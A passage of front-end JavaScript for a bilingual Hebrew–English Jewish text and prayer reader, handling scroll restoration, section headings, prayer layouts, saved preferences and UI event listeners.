                const transform = getComputedStyle(node).transform;
                if (transform && transform !== 'none') top -= new DOMMatrixReadOnly(transform).m42;
            }
            return top;
        }

        function captureReaderChunkAnchor() {
            const target = getPrimaryScrollElement();
            const pageTarget = target === document.documentElement || target === document.body;
            const viewTop = pageTarget ? 0 : target.getBoundingClientRect().top;
            for (const chunk of readerAnchorElements()) {
                const rect = chunk.getBoundingClientRect();
                if (rect.bottom <= viewTop) continue;
                const row = Array.from(chunk.querySelectorAll('.segment-row[data-segment]'))
                    .find((el) => el.getBoundingClientRect().bottom > viewTop);
                return {
                    ref: chunk.dataset.textChunkRef,
                    segment: row?.dataset.segment || '',
                    offset: restingViewportTop(row || chunk) - viewTop,
                };
            }
            return null;
        }

        function restoreReaderChunkAnchor(anchor) {
            if (!anchor?.ref) return false;
            const chunk = readerAnchorElements().find((el) => el.dataset.textChunkRef === anchor.ref);
            if (!chunk) return false;
            const row = anchor.segment
                ? Array.from(chunk.querySelectorAll('.segment-row[data-segment]')).find((el) => el.dataset.segment === anchor.segment)
                : null;
            const target = getPrimaryScrollElement();
            const pageTarget = target === document.documentElement || target === document.body;
            const viewTop = pageTarget ? 0 : target.getBoundingClientRect().top;
            const delta = (restingViewportTop(row || chunk) - viewTop) - anchor.offset;
            if (Math.abs(delta) < 1) return true;
            // 'instant' — html has scroll-behavior:smooth, so 'auto' would
            // animate the correction and read as a jump.
            if (pageTarget) {
                window.scrollTo({ top: getPrimaryScrollTop() + delta, behavior: 'instant' });
            } else {
                target.scrollTo({ top: target.scrollTop + delta, behavior: 'instant' });
            }
            return true;
        }

        // U-7: where the reader is in the view on screen -- its scroll, and
        // for a text the verse at the top -- kept on its history entry
        // (router annotateEntry) so Back/Forward lands there again. Null
        // while a view is loading.
        function captureViewScroll() {
            const view = appState.shownView?.type;
            if (!view) return null;
            return {
                view,
                top: Math.round(getPrimaryScrollTop()),
                anchor: view === 'text' ? captureReaderChunkAnchor() : null,
            };
        }

        // Back/Forward to `view`: once it has rendered, the verse (else the
        // offset) it was left at. False when nothing was saved for it.
        function restoreViewScroll(saved, view) {
            releaseViewScroll();
            if (!saved || saved.view !== view) return false;
            window.requestAnimationFrame(() => {
                if (saved.anchor && restoreReaderChunkAnchor(saved.anchor)) return;
                const top = Math.max(0, Number(saved.top) || 0);
                const target = getPrimaryScrollElement();
                if (target === document.documentElement || target === document.body) {
                    window.scrollTo({ top, behavior: 'instant' });
                } else {
                    target.scrollTo({ top, behavior: 'instant' });
                }
            });
            return true;
        }

        // The entry on screen learns where the reader is: when scrolling
        // settles (Back/Forward from a browser button, which the page only
        // hears about afterwards, still finds it), and at once as a view
        // is left -- before its entry stops being the one on screen, which
        // a push does only after the next view is under way. Debounced: a
        // few writes a minute at most, inside Safari's replaceState limit.
        //
        // Held from leaving a view until the next one has rendered and
        // scrolled (releaseViewScroll): in between, the scroll and the
        // content belong to neither. And Back/Forward has already put
        // another entry on screen by the time the page hears of it, so
        // nothing is saved while hydrateRoute opens the view for it.
        let _viewScrollSaveTimer = 0;
        let _viewScrollHeld = false;
        let _viewScrollSaveOff = false;
        function saveViewScroll() {
            window.clearTimeout(_viewScrollSaveTimer);
            if (_viewScrollHeld || _viewScrollSaveOff) return;
            const viewScroll = captureViewScroll();
            if (viewScroll) window.ShelahRouter?.annotateEntry?.({ viewScroll });
        }
        function leaveViewScroll() {
            saveViewScroll();
            _viewScrollHeld = true;
        }
        function releaseViewScroll() {
            _viewScrollHeld = false;
        }
        function saveViewScrollSoon() {
            window.clearTimeout(_viewScrollSaveTimer);
            _viewScrollSaveTimer = window.setTimeout(saveViewScroll, 400);
        }
        window.addEventListener('scroll', saveViewScrollSoon, { passive: true });
        mainContainer?.addEventListener('scroll', saveViewScrollSoon, { passive: true });

        function setControlLabel(button, label) {
            button.setAttribute('aria-label', label);
            button.title = label;
        }

        // Header strip above the text: show it and (re)label its buttons in the page language.
        function labelReaderTopBar() {
            if (!readerTopBar) return;
            syncReaderTopBarOffset();
            readerTopBar.classList.remove('hidden');

            if (readerLibraryTopBarBtn) setControlLabel(readerLibraryTopBarBtn, t('Library', 'ספרייה'));

            if (readerPrevTopBarBtn) {
                readerPrevTopBarBtn.classList.remove('hidden');
                setControlLabel(readerPrevTopBarBtn, t('Previous Section', 'קטע קודם'));
            }

            if (readerNextTopBarBtn) {
                readerNextTopBarBtn.classList.remove('hidden');
                setControlLabel(readerNextTopBarBtn, t('Next Section', 'קטע הבא'));
            }

            if (readerCommentaryTopBarBtn) {
                setControlLabel(readerCommentaryTopBarBtn, t('Commentary', 'מפרשים'));
                updateCommentaryHintVisibility();
            }

            if (readerSettingsBtn) {
                const settingsLabel = t('Reader Settings', 'הגדרות קריאה');
                setControlLabel(readerSettingsBtn, settingsLabel);
                if (readerSettingsBtnLabel) {
                    readerSettingsBtnLabel.textContent = settingsLabel;
                }
            }

            syncReaderTopBarControls();
        }

        // The first section repeats the page heading, so its own title is left out.
        function isRedundantSectionHeader(index, sectionTitle, sectionRefLabel) {
            // Use the stable title snapshot from when this text was first
            // loaded, not the live #readerTitle DOM text — that drifts as
            // the user scrolls (updateReaderHeaderForVisibleChunk), which
            // previously made this redundant-header decision flip on every
            // re-render depending on scroll position.
            const currentMainTitle = String(
                window.currentTextAnchorTitle || document.getElementById('readerTitle')?.innerText || ''
            ).trim();
            return Boolean(
                index === 0
                && currentMainTitle
                && (isLikelyDuplicateLabel(sectionTitle, currentMainTitle)
                    || isLikelyDuplicateLabel(sectionRefLabel, currentMainTitle)),
            );
        }

        function sectionTitleMarkup(chunk, index) {
            const sectionTitle = getChunkDisplayTitle(chunk);
            const sectionRefLabel = getChunkDisplayRef(chunk);
            if (isRedundantSectionHeader(index, sectionTitle, sectionRefLabel)) return '';
            const showRefMeta = Boolean(sectionRefLabel && !isLikelyDuplicateLabel(sectionTitle, sectionRefLabel));
            const parashaLabel = getChunkParashaLabel(chunk);
            const parashaChip = parashaLabel
                ? `<span class="reader-parasha-chip">${escapeHtml(parashaLabel)}</span>`
                : '';
            const refMeta = showRefMeta ? `<span class="reader-source-title-ref">${escapeHtml(sectionRefLabel)}</span>` : '';
            return `
                <div class="reader-source-title mb-2">
                    <span class="reader-source-title-main">${escapeHtml(sectionTitle)}</span>
                    ${refMeta}
                    ${parashaChip}
                </div>
            `;
        }

        function renderTextSection(chunk, index, layout) {
            const sectionRows = renderTextRowsForPayload(chunk, layout);
            const sectionRef = String(chunk?.ref || appState.currentView?.value || '').trim();
            const isHaftarah = chunk?.kind === 'haftarah';
            const titleMarkup = isHaftarah
                ? `<h2 class="reader-haftarah-heading">${haftarahHeadingMarkup(sectionRef, chunk.haftarahHeTitle)}</h2>`
                : sectionTitleMarkup(chunk, index);
            return `
                <div class="reader-source-clean${isHaftarah ? ' reader-haftarah' : ''} mb-6" data-text-chunk-index="${index}" data-text-chunk-ref="${escapeHtml(getRefTrackingKey(sectionRef) || sectionRef)}"${isHaftarah ? ' data-text-chunk-kind="haftarah"' : ''}>
                    ${titleMarkup}
                    <div class="reader-source-lines">
                        ${sectionRows}
                    </div>
                </div>
            `;
        }

        function renderCurrentTextByLayout(options = {}) {
            const { preserveScroll = false, anchorToVisibleChunk = false } = options;
            const chain = getCurrentTextPayloadChain();
            const data = chain[0];
            const readerContent = document.getElementById('readerContent');
            const sourcesDiv = document.getElementById('readerSources');

            if (!data || !readerContent || !sourcesDiv) return;

            const chunkAnchor = anchorToVisibleChunk ? captureReaderChunkAnchor() : null;
            const scrollState = (preserveScroll || anchorToVisibleChunk) ? captureReaderScrollState() : null;
            const layout = getNormalizedReaderLayout();
            infiniteReaderState.currentVisibleChunkIndex = Math.min(
                Math.max(Number(infiniteReaderState.currentVisibleChunkIndex) || 0, 0),
                Math.max(chain.length - 1, 0),
            );

            readerContent.innerHTML = '';

            labelReaderTopBar();

            const sectionsMarkup = chain.map((chunk, index) => renderTextSection(chunk, index, layout)).join('');

            sourcesDiv.innerHTML = `${sectionsMarkup}${infiniteReaderStatusMarkup()}`;

            // Synchronous (pre-paint) so the prepended section never flashes
            // into view before the correction lands.
            if (!(chunkAnchor && restoreReaderChunkAnchor(chunkAnchor)) && scrollState) {
                requestAnimationFrame(() => restoreReaderScrollState(scrollState));
            }

            bindSelectionInsightsEvents();
            // Start loading the commentary for the verse in view (once the
            // scroll position has been restored and settled).
            ensureCommentaryPreloader()?.refresh();

            // Set up section visibility observer and scroll-up loader after render
            setTimeout(() => {
                setupSectionScrollObserver();
                setupScrollUpListener();
                // Initialise buttons for the current visible chunk
                updateReaderButtonsForChunk(infiniteReaderState.currentVisibleChunkIndex);
            }, 60);

            if (shouldLoadNextTextChunk(260)) {
                void loadNextTextChunk();
            }
        }

        // `adoptRenderedText`: the rows on the page came from the server, so
        // they are redrawn in place rather than faded out and back in.
        function applyReaderPreferences({ adoptRenderedText = false } = {}) {
            const layout = getNormalizedReaderLayout();
            appState.prefs.readerLayout = layout;
            syncReaderDisplayRoute();

            reader.style.setProperty('--reader-font-size', `${appState.prefs.fontSize}px`);
            reader.style.setProperty('--reader-line-height', `${appState.prefs.lineHeight}`);

            if (window.currentTextPayload && appState.currentView?.type === 'text') {
                const sourcesDiv = document.getElementById('readerSources');
                const hasRenderedText = Boolean(sourcesDiv && sourcesDiv.children.length > 0);
                // M-6: a layout/vowel/size toggle fades the rebuilt text in
                // rather than snapping; nothing to fade from on the first
                // render, so that case skips straight to rendering.
                if (hasRenderedText && !adoptRenderedText) {
                    swapContent(sourcesDiv, () => renderCurrentTextByLayout({ preserveScroll: hasRenderedText }));
                } else {
                    // Adopting the server's rows: nothing above them changes, so
                    // there is no position to hold (holding one moved the page).
                    renderCurrentTextByLayout({ preserveScroll: hasRenderedText && !adoptRenderedText });
                }
            }
            // The siddur draws its own layout / vowels / cantillation.
            if (appState.currentView?.type === 'siddur') window.ShelahSiddur?.rerender();

            const sizePx = `${appState.prefs.fontSize}px`;
            const lineHeight = String(appState.prefs.lineHeight);

            document.querySelectorAll('#reader #readerContent, #reader #prayer-display').forEach(el => {
                el.style.fontSize = sizePx;
                el.style.lineHeight = lineHeight;
            });

            document.querySelectorAll('#reader .source-he, #reader .source-en').forEach(el => {
                el.style.fontSize = '';
                el.style.lineHeight = '';
            });

            const textViewActive = Boolean(window.currentTextPayload && appState.currentView?.type === 'text');
            if (!textViewActive) {
                document.querySelectorAll('#reader .source-grid').forEach(grid => {
                    grid.classList.remove('lg:grid-cols-2', 'lg:grid-cols-1', 'layout-reverse');
                    grid.classList.add(isDualColumnReaderLayout(layout) ? 'lg:grid-cols-2' : 'lg:grid-cols-1');
                    if (layout === 'bilingual-reverse') {
                        grid.classList.add('layout-reverse');
                    }
                });
            }

            document.querySelectorAll('#reader .source-he').forEach(el => {
                el.classList.toggle('hidden', layout === 'english');
            });

            document.querySelectorAll('#reader .source-en').forEach(el => {
                el.classList.toggle('hidden', layout === 'hebrew');
            });

            if (window.currentPrayerContent) {
                renderPrayerDisplayByLayout();
            }

            syncReaderSettingsVisibility();
            applyShulMode();
        }

        function splitPrayerParagraphs(value = '') {
            const deduped = stripDuplicateLeadingPrayerTitle(
                String(value || ''),
                String(window.currentPrayerName || ''),
            );
            const normalized = normalizeDisplayText(deduped).replaceAll('\r', '').trim();
            if (!normalized) return [];
            return normalized
                .split(/\n{2,}/)
                .map((p) => p.trim())
                .filter(Boolean);
        }

        // Security note (audit P1): rawText here may be either raw
        // Sefaria/prayer-API text (never escaped upstream) or, on the
        // Sefaria-augmented path, already-normalized-but-unescaped text
        // (see paragraphPairs construction in displayPrayer) -- these two
        // functions are the single point where paragraph text becomes
        // HTML, so they escape unconditionally rather than trusting an
        // upstream isHtml flag that doesn't cover every caller. They use
        // escapeDisplayTextPreservingEmphasis() rather than escapeHtml()
        // so Sefaria's <b>/<strong>/<i>/<em> rubric emphasis survives.
        function renderHebrewParagraph(rawText = '', includeTransliteration = true) {
            const displayText = applyHebrewDisplaySettings(rawText || '');
            if (!displayText) {
                return `<p class="text-slate-300 italic">${t('No Hebrew text in source', 'אין טקסט עברי במקור')}</p>`;
            }
            return `<p class="font-hebrew">${escapeDisplayTextPreservingEmphasis(displayText)}</p>${includeTransliteration ? transliterationMarkup(displayText) : ''}`;
        }

        function renderEnglishParagraph(rawText = '') {
            const displayText = String(rawText || '').trim();
            if (!displayText) {
                return `<p class="text-slate-300 italic">${t('No English translation in source', 'אין תרגום אנגלי במקור')}</p>`;
            }
            return `<p class="font-serif">${escapeDisplayTextPreservingEmphasis(displayText)}</p>`;
        }

        function renderPrayerBilingualRow(layout, { heText = '', enText = '', isHeader = false }) {
            const heDisplay = applyHebrewDisplaySettings(heText || '');
            const enDisplay = String(enText || '').trim();
            const rowPadding = isHeader ? 'pt-3 pb-2' : 'py-2';

            const heHeading = heDisplay ? escapeDisplayTextPreservingEmphasis(heDisplay) : '&nbsp;';
            const enHeading = enDisplay ? escapeDisplayTextPreservingEmphasis(enDisplay) : '&nbsp;';
            const hebrewContent = isHeader
                ? `<h3 class="font-hebrew text-xl font-bold">${heHeading}</h3>`
                : renderHebrewParagraph(heText, true);
            const englishContent = isHeader
                ? `<h3 class="font-serif text-xl font-bold">${enHeading}</h3>`
                : renderEnglishParagraph(enText);

            if (layout === 'interleaved') {
                return `
                    <div class="prayer-clean-row border-b border-slate-200 last:border-b-0 ${rowPadding}">
                        <div class="prayer-clean-he text-start" dir="rtl">${hebrewContent}</div>
                        <div class="prayer-clean-en text-start mt-2" dir="ltr">${englishContent}</div>
                    </div>
                `;
            }

            const hebrewColumn = `<div class="prayer-clean-he text-start" dir="rtl">${hebrewContent}</div>`;
            const englishColumn = `<div class="prayer-clean-en" dir="ltr">${englishContent}</div>`;
            const columns = layout === 'bilingual-reverse' ? [englishColumn, hebrewColumn] : [hebrewColumn, englishColumn];

            return `
                <div class="prayer-clean-row prayer-clean-row-dual grid grid-cols-1 lg:grid-cols-2 gap-4 border-b border-slate-200 last:border-b-0 ${rowPadding}">
                    ${columns[0]}
                    ${columns[1]}
                </div>
            `;
        }

        // Rows for the side-by-side and interleaved layouts.
        function prayerBilingualRows(layout, paragraphPairs) {
            if (paragraphPairs.length > 0) {
                return paragraphPairs.map((pair) => renderPrayerBilingualRow(layout, {
                    heText: pair.he || '',
                    enText: pair.en || '',
                    isHeader: pair.type === 'header',
                })).join('');
            }
            const heParagraphs = splitPrayerParagraphs(window.currentPrayerContent.he || '');
            const enParagraphs = splitPrayerParagraphs(window.currentPrayerContent.en || '');
            const maxRows = Math.max(heParagraphs.length, enParagraphs.length, 1);
            return Array.from({ length: maxRows }, (_, idx) => renderPrayerBilingualRow(layout, {
                heText: heParagraphs[idx] || '',
                enText: enParagraphs[idx] || '',
                isHeader: false,
            })).join('');
        }

        // The prayer arrived as HTML: one row with the text as the server sent it.
        function prayerHtmlSingleLanguageMarkup(lang, contentRaw) {
            const dir = lang === 'he' ? 'rtl' : 'ltr';
            const contentDisplay = lang === 'he'
                ? applyHebrewDisplaySettings(contentRaw)
                : contentRaw;
            const fontClass = lang === 'he' ? 'font-hebrew' : 'font-serif';
            const translit = lang === 'he' ? transliterationMarkup(normalizeDisplayText(contentRaw || '')) : '';
            // Some Sefaria sources (e.g. Havdala in Siddur Sefard) have no
            // English translation at all -- without this, a single-language
            // English view renders a blank content pane instead of an
            // explanation (audit C4). Matches the placeholder already used
            // by renderHebrewParagraph/renderEnglishParagraph below.
            const isEmpty = !String(contentDisplay || '').trim();
            const emptyNote = lang === 'he'
                ? t('No Hebrew text in source', 'אין טקסט עברי במקור')
                : t('No English translation in source', 'אין תרגום אנגלי במקור');
            const bodyMarkup = isEmpty
                ? `<p class="text-slate-300 italic">${emptyNote}</p>`
                : `<div class="${fontClass}">${contentDisplay}</div>${translit}`;

            return `
                <div class="prayer-clean-lines">
                    <div class="prayer-clean-row border-b border-slate-200 last:border-b-0 py-2">
                        <div class="${lang === 'he' ? 'prayer-clean-he text-start' : 'prayer-clean-en'}" dir="${dir}">
                            ${bodyMarkup}
                        </div>
                    </div>
                </div>
            `;
        }

        function prayerParagraphSingleLanguageMarkup(lang, contentRaw) {
            const dir = lang === 'he' ? 'rtl' : 'ltr';
            const paragraphs = splitPrayerParagraphs(contentRaw);
            const list = (paragraphs.length ? paragraphs : [String(contentRaw || '')]).map((paragraph) => {
                const rendered = lang === 'he'
                    ? renderHebrewParagraph(paragraph, true)
                    : renderEnglishParagraph(paragraph);
                return `
                    <div class="prayer-clean-row border-b border-slate-200 last:border-b-0 py-2">
                        <div class="${lang === 'he' ? 'prayer-clean-he text-start' : 'prayer-clean-en'}" dir="${dir}">${rendered}</div>
                    </div>
                `;
            }).join('');
            return `<div class="prayer-clean-lines">${list}</div>`;
        }

        function prayerDisplayMarkup(layout, selectedLang) {
            if (layout === 'bilingual' || layout === 'bilingual-reverse' || layout === 'interleaved') {
                const pairs = Array.isArray(window.currentPrayerParagraphPairs) ? window.currentPrayerParagraphPairs : [];
                return `<div class="prayer-clean-lines">${prayerBilingualRows(layout, pairs)}</div>`;
            }
            const lang = selectedLang || (layout === 'hebrew' ? 'he' : 'en');
            const contentRaw = window.currentPrayerContent[lang] || window.currentPrayerContent.en || '';
            return window.currentPrayerIsHtml && (lang === 'he' || lang === 'en')
                ? prayerHtmlSingleLanguageMarkup(lang, contentRaw)
                : prayerParagraphSingleLanguageMarkup(lang, contentRaw);
        }

        function renderPrayerDisplayByLayout(selectedLang = null) {
            const contentDiv = document.getElementById('prayer-display');
            if (!contentDiv || !window.currentPrayerContent) return;

            contentDiv.innerHTML = prayerDisplayMarkup(getNormalizedReaderLayout(), selectedLang);

            const sizePx = `${appState.prefs.fontSize}px`;
            const lineHeight = String(appState.prefs.lineHeight);
            contentDiv.style.fontSize = sizePx;
            contentDiv.style.lineHeight = lineHeight;

            // Prayer content is re-rendered dynamically; force descendants to inherit
            // current reader typography so size/density controls always apply.
            contentDiv.querySelectorAll('*').forEach((el) => {
                if (!el.classList.contains('text-xs')) {
                    el.style.fontSize = 'inherit';
                }
                el.style.lineHeight = 'inherit';
            });
        }

        function normalizeComparablePrayerTitle(value = '') {
            return normalizeDisplayText(String(value || ''))
                .toLowerCase()
                .replace(/[^a-z0-9\u0590-\u05ff\s]/gi, ' ')
                .replace(/\s+/g, ' ')
                .trim();
        }

        function stripDuplicateLeadingPrayerTitle(rawContent = '', prayerTitle = '') {
            const normalizedTitle = normalizeComparablePrayerTitle(prayerTitle);
            if (!normalizedTitle) return String(rawContent || '');

            const normalized = normalizeDisplayText(String(rawContent || ''));
            if (!normalized) return '';

            const paragraphs = normalized
                .split(/\n{2,}/)
                .map((part) => part.trim())
                .filter(Boolean);

            if (!paragraphs.length) return normalized;

            const firstComparable = normalizeComparablePrayerTitle(paragraphs[0]);
            const isDuplicateTitle = firstComparable
                && (firstComparable === normalizedTitle
                    || firstComparable.startsWith(`${normalizedTitle} `)
                    || normalizedTitle.startsWith(`${firstComparable} `));

            if (!isDuplicateTitle) return normalized;
            return paragraphs.slice(1).join('\n\n');
        }

        function hydratePreferences() {
            try {
                const saved = JSON.parse(localStorage.getItem(APP_PREFS_KEY) || '{}');
                appState.prefs = {
                    ...appState.prefs,
                    ...saved,
                };
            } catch {
                // Keep defaults when no saved prefs are available.
            }

            const legacyCommunityMap = {
                Ashkenazi: 'Ashkenaz',
                Sefardi: 'Sefardic',
                Sephardi: 'Sefardic',
                Mizrahi: 'Iraqi',
                'Turkish-Ottoman Sefardic': 'Turkish-Ottoman',
                'turkish-ottoman-sefardic': 'Turkish-Ottoman',
                'Legacy Customs DB': 'Ashkenaz',
            };
            if (legacyCommunityMap[appState.prefs.community]) {
                appState.prefs.community = legacyCommunityMap[appState.prefs.community];
            }
            // The community setting (state.js getMinhag): only a known value is kept.
            const normalizeMinhag = window.ShelahState?.normalizeMinhag;
            if (normalizeMinhag) {
                const minhag = normalizeMinhag(appState.prefs.minhag);
                if (minhag) appState.prefs.minhag = minhag;
                else delete appState.prefs.minhag;
            }

            const legacyShowSidebars = appState.prefs.showSidebars !== false;
            if (typeof appState.prefs.showLeftSidebar !== 'boolean') {
                appState.prefs.showLeftSidebar = legacyShowSidebars;
            }
            if (typeof appState.prefs.showRightSidebar !== 'boolean') {
                appState.prefs.showRightSidebar = false;
            }
            delete appState.prefs.showSidebars;

            appState.prefs.metadataFilters = normalizeMetadataFilters(appState.prefs.metadataFilters || {});
            if (appState.prefs.readerLayout === 'stacked') {
                appState.prefs.readerLayout = 'interleaved';
            }

            if (!['bilingual', 'bilingual-reverse', 'interleaved', 'english', 'hebrew'].includes(appState.prefs.readerLayout)) {
                appState.prefs.readerLayout = 'bilingual';
            }

            const layoutManuallySet = localStorage.getItem(READER_LAYOUT_MANUAL_KEY) === '1';
            if (regionalDefaults.language === 'he' && !layoutManuallySet) {
                appState.prefs.readerLayout = 'hebrew';
            }

            appState.prefs.webSearch = appState.prefs.webSearch !== false;
            appState.prefs.transliteration = Boolean(appState.prefs.transliteration);
            appState.prefs.showVowels = appState.prefs.showVowels !== false;
            appState.prefs.showCantillation = appState.prefs.showCantillation !== false;
            appState.prefs.shulMode = Boolean(appState.prefs.shulMode);
            appState.prefs.shulAutoScroll = Boolean(appState.prefs.shulAutoScroll);
            appState.prefs.shulScrollSpeed = Number(appState.prefs.shulScrollSpeed || 28);
            appState.prefs.theme = normalizeThemePreference(appState.prefs.theme || 'light');

            setThemePreference(appState.prefs.theme, { persist: false });

            syncPrefsInputsFromState();

            importShelfFromHashIfPresent();

            applyReaderPreferences();
            applySidebarVisibility();
            renderPersonalShelf();
            updateBookmarkButton();

            preferencesHydrated = true;
            window.ShelahState?.announceMinhag?.();
            if (pendingInitialRoute) {
                const route = pendingInitialRoute;
                pendingInitialRoute = null;
                hydrateRoute(route, { isInitial: true });
            }
        }

        async function openShelfItem(type, value, label) {
            if (type === 'text') {
                await readText(value);
                return;
            }
            if (type === 'prayer') {
                await displayPrayer(value);
                return;
            }
            if (type === 'siddur') {
                await displaySiddur(value);
                return;
            }
            if (type === 'community') {
                await displayCommunity(value);
                return;
            }
            if (type === 'history') {
                displayAskHistoryPage();
                return;
            }
            if (type === 'ask') {
                // Stored answer by id; a legacy question-text entry is matched to
                // the stored answer (and rewritten to its id); otherwise ask again.
                const result = window.ShelahAskHistory
                    ? await window.ShelahAskHistory.resolveShelfAsk({ value, label }, {
                        signedIn: askHistoryAuthState() === 'signed-in',
                        fetchEntry: fetchAskHistoryEntry,
                        searchHistory: (q) => fetchAskHistoryPage({ q, limit: 10 }),
                    })
                    : { reask: value || label || '' };
                if (result.migrateTo) promoteShelfAsk(value, result.migrateTo);
                if (result.staleId) dropShelfAsk(result.staleId);
                if (result.item) {
                    openStoredAskAnswer(result.item);
                    return;
                }
                // Asked from the shelf, not the search bar: the panel carries the wait.
                await handleAiSearch(result.reask || '', { origin: 'panel' });
            }
        }

        // The AI mode, community and web-search switch are picked in the chat's
        // settings menu (conversation-ui.js), which saves them here as the defaults.
        window.ShelahPrefs = {
            set(key, value) {
                const valid = key === 'webSearch' ? typeof value === 'boolean' : ['mode', 'community'].includes(key);
                if (!valid || appState.prefs[key] === value) return;
                appState.prefs[key] = value;
                savePrefs();
            },
            // state.js setMinhag() has already updated appState.prefs.
            save() {
                savePrefs();
            },
        };

        if (openAiSettingsBtn) {
            openAiSettingsBtn.addEventListener('click', () => {
                closeSettingsMenu();
                window.ShelahConversationUI?.openSettings(settingsMenuBtn);
            });
        }

        if (themeToggleBtn) {
            themeToggleBtn.addEventListener('click', () => {
                cycleThemePreference();
            });
        }

        readerLayoutSelect.addEventListener('change', () => {
            appState.prefs.readerLayout = readerLayoutSelect.value;
            localStorage.setItem(READER_LAYOUT_MANUAL_KEY, '1');
            releaseRouteDisplayPref('layout');
            savePrefs();
            applyReaderPreferences();
        });

        readerFontSize.addEventListener('input', () => {
            appState.prefs.fontSize = Number(readerFontSize.value);
            updateReaderRangeFill(readerFontSize);
            releaseRouteDisplayPref('size');
            savePrefs();
            applyReaderPreferences();
        });

        readerLineHeight.addEventListener('input', () => {
            appState.prefs.lineHeight = Number(readerLineHeight.value);
            updateReaderRangeFill(readerLineHeight);
            savePrefs();
            applyReaderPreferences();
        });

        if (transliterationToggle) {
            transliterationToggle.addEventListener('change', () => {
                appState.prefs.transliteration = transliterationToggle.checked;
                releaseRouteDisplayPref('translit');
                savePrefs();
                applyReaderPreferences();
            });
        }

        if (shulModeToggle) {
            shulModeToggle.addEventListener('change', () => {
                appState.prefs.shulMode = shulModeToggle.checked;
                savePrefs();
                applyShulMode();
            });
        }

        if (shulAutoScrollToggle) {
            shulAutoScrollToggle.addEventListener('change', () => {
                appState.prefs.shulAutoScroll = shulAutoScrollToggle.checked;
                savePrefs();
                applyShulMode();
            });
        }

        if (shulScrollSpeed) {
            shulScrollSpeed.addEventListener('input', () => {
                appState.prefs.shulScrollSpeed = Number(shulScrollSpeed.value || 28);
                updateReaderRangeFill(shulScrollSpeed);
                savePrefs();
                if (appState.prefs.shulMode && appState.prefs.shulAutoScroll) {
                    startShulAutoScroll();
                }
            });
        }

        if (showVowelsToggle) {
            showVowelsToggle.addEventListener('change', () => {
                appState.prefs.showVowels = showVowelsToggle.checked;
                releaseRouteDisplayPref('vowels');
                savePrefs();
                applyReaderPreferences();
            });
        }

        if (showCantillationToggle) {
            showCantillationToggle.addEventListener('change', () => {
                appState.prefs.showCantillation = showCantillationToggle.checked;
                releaseRouteDisplayPref('taamim');
                savePrefs();
                applyReaderPreferences();
            });
        }

        bookmarkCurrentBtn.addEventListener('click', toggleBookmarkCurrent);
        if (semanticBookmarkBtn) {
            semanticBookmarkBtn.addEventListener('click', saveSemanticBookmark);
            // Explicit, scope-independent signal for static/js/reader-ui.js's
            // installSemanticBookmarking() guard — do not
            // remove until the inline copy above is deleted.
            window.__shelahLegacyBookmarkBound = true;
        }
        if (mobileLangToggle) {
            mobileLangToggle.addEventListener('click', () => {
                toggleLanguage(getCurrentLanguage() === 'he' ? 'en' : 'he');
            });
        }
        if (closeLeftSidebarBtn) {
            closeLeftSidebarBtn.addEventListener('click', closeMobilePanels);
        }
        if (closeRightSidebarBtn) {
            closeRightSidebarBtn.addEventListener('click', closeMobilePanels);
        }
        if (mobileDrawerBackdrop) {
            mobileDrawerBackdrop.addEventListener('click', closeMobilePanels);
        }
        if (hideLeftSidebarBtn) {
            hideLeftSidebarBtn.addEventListener('click', () => setSidebarVisibility('left', false));
        }
        if (hideRightSidebarBtn) {
            hideRightSidebarBtn.addEventListener('click', () => setSidebarVisibility('right', false));
        }
        if (showLeftSidebarTopBtn) {
            showLeftSidebarTopBtn.addEventListener('click', () => setSidebarVisibility('left', true));
        }
        if (mobileBottomTabs) {
            mobileBottomTabs.querySelectorAll('[data-mobile-tab]').forEach((btn) => {
                btn.addEventListener('click', () => {
                    const tab = btn.dataset.mobileTab;
                    if (tab === 'home') {
                        setActiveMobileTab('home');
                        setMobileSearchExpanded(false);
                        goHome();
                        window.setTimeout(() => {
                            scrollPrimaryToTop('smooth');
                        }, 80);
                        return;
                    }
                    if (tab === 'search') {
                        setActiveMobileTab('search');
                        setMobileSearchExpanded(true);
                        closeMobilePanels();
                        const isTextView = appState.currentView?.type === 'text' && !reader?.classList.contains('hidden');
                        if (!isTextView) {
                            window.setTimeout(() => {
                                scrollPrimaryToTop('smooth');
                            }, 40);
                        }
                        if (searchInput) {
                            searchInput.focus({ preventScroll: true });
                        }
                        return;
                    }
                    if (tab === 'library') {
                        setActiveMobileTab('library');
                        setMobileSearchExpanded(false);
                        if (isMobileViewport()) {
                            openMobilePanel('left');
                        } else {
                            setSidebarVisibility('left', true);
                        }
                        return;
                    }
                    if (tab === 'daily') {
                        setActiveMobileTab('daily');
                        setMobileSearchExpanded(false);
                        closeMobilePanels();
                        focusHomeDailySection();
                    }
                });
            });
            setActiveMobileTab('home');
            // Keep the pill on its tab through rotation, font loading and language
            // changes (label widths / bar height can shift).
            if (typeof ResizeObserver === 'function') {
                new ResizeObserver(() => syncMobileTabIndicator({ animate: false })).observe(mobileBottomTabs);
            }
            void document.fonts?.ready?.then(() => syncMobileTabIndicator({ animate: false }));
        }

        if (mainContainer) {
            mainContainer.addEventListener('scroll', handleInfiniteReaderScroll, { passive: true });
        }
        window.addEventListener('scroll', handleInfiniteReaderScroll, { passive: true });

        window.addEventListener('resize', () => {
            syncReaderTopBarOffset();
            applySidebarVisibility();
            if (userProfileMenu && !userProfileMenu.classList.contains('hidden')) {
                positionUserProfileMenu();
            }
            if (appState.prefs.shulMode) {
                applyShulMode();
            }
        });

        // Close menus when clicking outside them
        document.addEventListener('click', (e) => {
            // Close user profile menu if clicking outside of it
            if (userProfileMenuContainer && !userProfileMenuContainer.contains(e.target)) {
                closeUserProfileMenu();
            }
            // Close settings menu if clicking outside of it
            if (settingsMenuContainer && !settingsMenuContainer.contains(e.target)) {
                closeSettingsMenu();
            }
        });

        if (settingsMenuBtn) {
            settingsMenuBtn.addEventListener('click', (e) => {
                e.stopPropagation();
                toggleSettingsMenu();
            });
        }

        window.addEventListener('resize', () => {
            if (!settingsPanel || settingsPanel.classList.contains('hidden')) return;
            positionSettingsPanel();
        });
        window.addEventListener('orientationchange', () => {
            if (!settingsPanel || settingsPanel.classList.contains('hidden')) return;
            positionSettingsPanel();
        });

        if (userProfileMenuBtn) {
            userProfileMenuBtn.addEventListener('click', (e) => {
                e.stopPropagation();
                toggleUserProfileMenu();
            });
        }

        if (readerSettingsBtn) {
            readerSettingsBtn.addEventListener('click', (e) => {
                e.stopPropagation();
                toggleReaderSettingsPanel();
            });
        }

        if (readerLibraryTopBarBtn) {
            readerLibraryTopBarBtn.addEventListener('click', (e) => {
                e.stopPropagation();
                if (appState.prefs.shulMode) {
